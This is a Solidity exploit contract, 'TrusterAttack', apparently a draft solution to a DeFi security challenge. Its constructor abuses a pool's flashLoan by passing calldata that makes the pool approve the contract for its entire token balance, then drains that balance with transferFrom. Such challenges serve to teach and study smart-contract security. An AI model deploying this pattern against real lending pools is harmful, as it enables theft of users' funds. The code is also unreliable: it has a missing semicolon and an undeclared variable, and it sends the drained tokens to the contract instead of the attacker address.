pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
        ) external;
}

contract TrusterAttack {
    using Address for address;

    address public pool;
    IERC20 public token;
    address public attacker;
    uint256 public balance;

    constructor(address poolAddress,
                address tokenAddress,
                address attackerAddress
               ) 
    {
//        console.log("Sender balance is %s tokens", balances[msg.sender]);
        console.log("Trying to send from %s to %s", tokenAddress, attackerAddress);
        token = IERC20(tokenAddress);
        attacker = attackerAddress;
        pool = poolAddress
        balance = token.balanceOf(pool);
        uint256 transferAmount = 0;
        console.log("Starting flashloan %s",balance);
        IPoolFunc(pool).flashLoan(
            transferAmount,
            address(this),
            tokenAddress,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                balance
            )
        );
        console.log("Flashloan complete %s", token.balanceOf(attacker));
        //token.transfer(pool, transferAmount);
        //IERC20(tokenAddress).transfer(attackerAddress, balance);
        //calldata = approve(pool, this)
        //response 
        amount = token.balanceOf(pool);
        token.transferFrom(poolAddress,address(this) , amount);
        // token.tranfser(amount,attacker)
        //
    }
    // function transferMe() public{
    // }

   
}